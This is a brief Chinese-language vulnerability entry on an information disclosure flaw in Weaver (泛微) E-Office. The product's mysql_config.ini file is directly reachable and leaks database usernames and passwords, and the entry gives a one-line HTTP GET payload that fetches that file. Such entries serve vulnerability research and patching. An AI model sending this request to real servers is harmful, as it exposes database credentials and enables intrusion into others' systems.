**漏洞描述：**

泛微 E-Office mysql_config.ini文件可直接访问，泄漏数据库账号密码等信息。

**影响版本：**

泛微E-Office

**Payload：**

```
GET /*/mysql_config.ini
```

---
